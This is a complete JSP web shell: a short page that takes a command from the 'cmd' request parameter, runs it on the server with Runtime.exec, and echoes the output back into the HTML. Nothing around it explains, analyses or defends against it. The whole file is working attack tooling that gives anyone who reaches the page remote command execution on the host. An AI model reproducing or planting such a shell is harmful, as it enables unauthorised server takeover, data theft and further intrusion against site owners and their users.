<%@ page language="java" import="javazoom.upload.*,java.util.*,java.io.*" %>
<HTML>
<BODY>
<PRE>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " +request.getParameter("cmd"));
Process p =Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML> 